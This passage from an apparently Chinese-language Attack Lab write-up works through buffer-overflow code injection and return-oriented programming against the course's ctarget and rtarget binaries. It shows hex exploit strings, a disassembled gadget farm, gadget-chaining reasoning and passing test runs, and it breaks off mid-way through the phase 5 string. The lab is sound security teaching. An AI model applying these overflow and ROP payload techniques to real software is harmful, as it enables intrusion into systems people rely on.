$0x4018fa</span><br><span class="line">   c:c3                   retq</span><br></pre></td></tr></table></figure><p>那么类似于实验２，我们首先得到前0x40的字符串的初始状态(hex2raw之前)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 c0 dc 61 55 68 fa 18 40 00 c3 ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff 78 dc 61 55 00 00 00 00</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br></pre></td></tr></table></figure><p>接下来的位置就要存放cookie了，因为我的cookie是0x59b997fa,所以我应该构造的字符串是”0x59b997fa’\0’”,注意一定要有末尾的’\0’，这代表了字符串的结束。然后是存放的位置，因为是小端法，所以直接写入(注意不含0x)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 c0 dc 61 55 68 fa 18 40 00 c3 ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff 78 dc 61 55 00 00 00 00</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff 35 39 62 39 39 37 66 61</span><br><span class="line">00 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br></pre></td></tr></table></figure><p>利用hex2raw转化之后执行，pass!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 ./hex2raw&lt;level3.txt &gt;level3-raw.txt</span><br><span class="line">➜  target1 ./ctarget -q &lt;level3-raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:3:48 C7 C7 C0 DC 61 55 68 FA 18 40 00 C3 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 35 39 62 39 39 37 66 61 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>CI部分的实验一开始实现起来比较困难，主要是卡在了大小端问题以及栈模型地址生长方向这些细节问题上，其实理清之后就是顺理成章的写出了对应的攻击串，也算是初步的体会了溢出攻击的威力。</p><h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h3><h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>这一部分难度开始增加，注意到实验报告中提到</p><ul><li>It uses randomization so that the stack positions differ from one run to another. This makes it impos-<br>sible to determine where your injected code will be located.</li><li>It marks the section of memory holding the stack as nonexecutable, so even if you could set the<br>program counter to the start of your injected code, the program would fail with a segmentation fault.<br>也就是说，在这一部分实验中，一方面因为栈随机化我们不太可能像之前一样通过设置返回地址到我们的代码部分来执行我们的代码，另一方面因为分块权限控制，栈上我们注入的代码也不会被执行，所以我们需要另外去找办法。<br>实验指导书上给出了另外一种思路，类似于这样的代码片段<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;getval_210&gt;:</span><br><span class="line">  400f15:c7 07 d4 48　89 c7  mov    $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b:c3                   retq</span><br></pre></td></tr></table></figure></li></ul><p>这一类类似的片段以ret结尾(0xc3)而ret之前的一段片段截断后可以解释出不同的含义，比如这里的我们截断出48 89 c7则可以解释为movq %rax,%rdi,这类似的含义可以从实验指导书附录的3A中找到，那么我们可以利用这一些片段来实现一些功能，而他们末尾的ret也可以让我们实现在不同的片段之间去跳转。于是按照指示从start_farm到end_farm中去寻找这样的片段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401999:c3                   retq</span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:b8 fb 78 90 90       mov    $0x909078fb,%eax</span><br><span class="line">  40199f:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4019d5:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:c7 07 99 d1 90 90    movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:8d 87 89 ce 78 c9    lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:8d 87 8d d1 20 db    lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:b8 89 d1 48 c0       mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:c3                   retq</span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:c7 07 81 d1 84 c0    movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:c7 07 88 c2 08 c9    movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:b8 48 89 e0 c1       mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:8d 87 89 c2 00 c9    lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:8d 87 89 ce 38 c0    lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:c7 07 81 ce 08 db    movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:8d 87 c8 89 e0 c3    lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:8d 87 89 c2 84 c0    lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:8d 87 48 89 e0 c7    lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:b8 99 d1 08 d2       mov    $0xd208d199,%eax</span><br><span class="line">  401a53:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:b8 89 c2 c4 c9       mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:c7 07 48 89 e0 91    movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:8d 87 89 ce 92 c3    lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:b8 89 d1 08 db       mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:c7 07 89 d1 91 c3    movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:c7 07 81 c2 38 d2    movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:c7 07 09 ce 08 c9    movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:8d 87 08 89 e0 90    lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:8d 87 89 c2 c7 3c    lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:b8 88 ce 20 c0       mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:c7 07 48 89 e0 c2    movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:8d 87 89 c2 60 d2    lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:b8 8d ce 20 d2       mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:c3                   retq</span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401ab7:c3                   retq</span><br><span class="line">  401ab8:90                   nop</span><br><span class="line">  401ab9:90                   nop</span><br><span class="line">  401aba:90                   nop</span><br><span class="line">  401abb:90                   nop</span><br><span class="line">  401abc:90                   nop</span><br><span class="line">  401abd:90                   nop</span><br><span class="line">  401abe:90                   nop</span><br><span class="line">  401abf:90                   nop</span><br></pre></td></tr></table></figure><p>现在要利用ROP来实现phase_2中的功能。那么我们就需要去把cookie放到%rdi中，然后覆盖掉对应的位置压入touch3的地址然后ret.<br>实验指导书中给出了Some Advice:</p><blockquote><ul><li>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.</li><li>You can do this attack with just two gadgets.</li><li>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</li></ul></blockquote><p>按照他给的建议，我们可以猜测这个实验可以这样进行。首先将一些需要用到的代码片段的addresses写在我们的string里面，然后通过溢出写到栈上。而我们知道pop会使得栈指针的地址增大，那么我们可以通过不断的pop和ret来在代码片段中跳转，最终实现我们需要的功能。<br>根据提示我们在start_farm到mid_farm中去寻找线索,我们首先注意到这个片段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   retq</span><br></pre></td></tr></table></figure><p>注意到58 90 c3这一段，其中90代表nop也就是表示什么都不做继续道下一行，而c3是ret,58是popq %rax,也就是说我们可以通过这一个片段把cookie写到rax中，那么我们还需要一个mov %rax,%rdi来把cookie写到%rax中,继续寻找发现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq</span><br></pre></td></tr></table></figure><p>注意到48 89 c7是表示movq %rax,%rdi而紧跟着c3表示ret，恰好符合我们的要求，这样cookie我们就搞定了，只需要写好地址，算好偏移量，不断的通过pop来调整就能实现我们想要的结果。于是我们去查看getbuf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 ac 03 00 00       callq  401b60 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   retq</span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br></pre></td></tr></table></figure><p>显然为我们的字符串分配了0x28大小的空间而我们知道栈的内存模型中栈顶是低地址，栈底是高地址。通过sub之后add会让栈指针回到原来的地址，然后这个位置指向的应该是存储的返回地址，而每一次pop都会让栈指针地址增大，则我们应该往上覆盖,也就是我们的需要跳转的地址应该写在后面。很轻易的我们就写出了这样的一串字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00 ff ff ff ff ff ff ff ff</span><br></pre></td></tr></table></figure><p>调用测试，pass!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 ./hex2raw &lt;phase_4.txt &gt;phase_4-raw.txt</span><br><span class="line">➜  target1 ./rtarget -q &lt;phase_4-raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:rtarget:2:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 FF FF FF FF FF FF FF FF</span><br></pre></td></tr></table></figure><h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>这一部分的实验中则要求用ROP去完成phase_3，显然类似于当时的情况我们需要考虑存储的位置，然后把这个地址值赋给rdi,其实是和phase_4差不多的，只是我们把cookie换成了存储cookie的地址。但因为栈随机化技术，我们无法像phase_3中那样直接写入这个地址，于是我们需要想想办法。<br>我们注意到因为我们输入的字符串是可以控制的，那么我们存放字符串的位置相对于栈地址的偏移则是可以算出来的，既然如此我们可以先拿到%rsp,然后加上偏移地址得到字符串地址，接下来的就和phase_3一样了，只是需要采用ROP.这一次我们从start_farm看到end_farm。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:c3                   retq</span><br></pre></td></tr></table></figure><p>这一个片段中的48 89 e0可以实现mov %rsp,%rax的功能，因为要进行计算我们发现了这样一串有意思的片段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq</span><br></pre></td></tr></table></figure><p>这一串的意思是吧%rsi和%rdi加起来送到%rax中去,那么我们想到能不能把%rsp送到%rsi或者%rdi中，然后把偏移值送到另一个寄存器中，这样我们再去找找有没有把%rax送到%rdi中的指令.而根据前一个实验我们知道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq</span><br></pre></td></tr></table></figure><p>其中的48 89 c7能实现mov %rax,%rdi的功能,那么我们这个思路就是有实现可能的。我们先把%rsp送到%rax中，再把%rax送到%rdi中，这样就实现了把%rsp送到%rdi中的功能，于是我们只需要再把偏移值写到我们的字符串中，通过pop %rsi送到%rsi中，然后调用add_xy即可算出。于是我们再去寻找pop %rsi,但却一无所获，于是我们只能通过一些其他办法实现。我们将整个farm中所有可能的mov操作都列举出来，方便查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   retq</span><br></pre></td></tr></table></figure><p>89 c2实现了mov %eax,%edx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   retq</span><br></pre></td></tr></table></figure><p>89 ce实现了％ecx,%esi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   retq</span><br></pre></td></tr></table></figure><p>89 d1实现了mov %edx,%ecx，而后面的38 c9则是cmp指令，不改变值。到此，似乎我们已经可以实现我们想要的操作了，整理一下:<br>我们现在需要将偏移值送到%rsi中，首先通过pop %rax送到%rax中，然后通过mov %eax,%edx送到%edx中，然后通过mov %edx,%ecx送到%ecx中，最后通过mov %ecx,%esi送到%esi中，这里我们注意到偏移值在32位表示范围之内，所以我们这个思路应该是可以实现的。至于偏移值到底是多少，不如先留空最后再做决定，于是我们先得到这样一个字符串(hex2raw之前的):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ab 19 40 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00</span><br><span class="line">#rsp-&gt;06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61</span><br><span class="line">00 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br></pre></td></tr></table></figure><p>其中全0的八个字节应该是我们需要的偏移量，现在我们来计算一下这个偏移量到底是多少,注意我标注为rsp那一个位置，哪一行的地址是将%rsp的值送到％rax,而我们字符串存放的位置在这一行地址之后还要0x20个字节，于是我们考虑偏移量为0x20</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 